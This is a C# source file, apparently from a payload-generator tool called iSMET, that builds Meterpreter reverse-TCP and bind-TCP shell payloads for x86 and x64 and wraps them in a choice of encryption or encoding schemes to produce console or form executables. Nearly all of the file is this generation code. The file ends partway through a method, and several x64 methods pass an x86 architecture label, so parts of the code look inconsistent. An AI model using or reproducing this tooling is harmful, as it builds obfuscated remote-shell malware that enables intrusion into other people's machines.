using System;
using System.IO;
using System.Security.Cryptography;
using iSMET.Encryption;
using iSMET.CSharp.Collection;
using iSMET.ShellCode;

namespace iSMET
{
	public class CSharpLibrary
	{
		public class ConsoleApplication
		{
			private MeterpreterShellCode.x86ShellCode x86ShellCode = new MeterpreterShellCode.x86ShellCode();
			private MeterpreterShellCode.x64ShellCode x64ShellCode = new MeterpreterShellCode.x64ShellCode();
			private EncrypterMethod _encryptMethod = new EncrypterMethod();
			public string FileName = string.Empty;
			int appType = (int)ApplicationType.ConsoleApplication;
			public void ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
                byte[] array = x86ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
                byte[] array = x86ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void ShellReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void x64ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
			}
			public void x64ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
			}
			public void x64ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
			}
			public void BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void ShellBindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void ShellBindTcpRc4(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellBindTcpRc4(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), appType);
				}
			}
			public void x64BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
			}
			public void x64ShellBindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellBindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x64.ToString(), appType);
				}
			}
		}
		public class FormApplication
		{
			public string fileName = string.Empty;
			private MeterpreterShellCode.x86ShellCode x86ShellCode = new MeterpreterShellCode.x86ShellCode();
			private MeterpreterShellCode.x64ShellCode x64ShellCode = new MeterpreterShellCode.x64ShellCode();
			private EncrypterMethod _encryptMethod = new EncrypterMethod();
            private const int AppType = (int) ApplicationType.FormApplication;
            public void ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void ShellReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.ShellReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void x64ReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void x64ReverseTcpRc4(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ReverseTcpRc4(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void x64ShellReverseTcp(string Ip, string Port, int encryption, int timeOut)
			{
				byte[] array = x64ShellCode.ShellReverseTcp(Ip, Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x64.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void BindTcp(string Port, int encryption, int timeOut)
			{
				byte[] array = x86ShellCode.BindTcp(Port);
				if (encryption == (int)EncryptionType.NonEncryption)
				{
					_encryptMethod.NonEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Base64)
				{
					_encryptMethod.Base64Encoding(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.Rinjdael)
				{
					_encryptMethod.RinjdaelEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.DES)
				{
					_encryptMethod.DESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.TripleDES)
				{
					_encryptMethod.TripleDESEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RcTwo)
				{
					_encryptMethod.RCTWOEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.RSA)
				{
					_encryptMethod.RSAEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.AESCBC)
				{
					_encryptMethod.AESCBCEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
				else if (encryption == (int)EncryptionType.BlowFish)
				{
					_encryptMethod.BlowFishEncryption(array, timeOut, Architecture.x86.ToString(), AppType);
				}
			}
			public void ShellBindTcp(string Port, int encryption, int timeOut)
			{
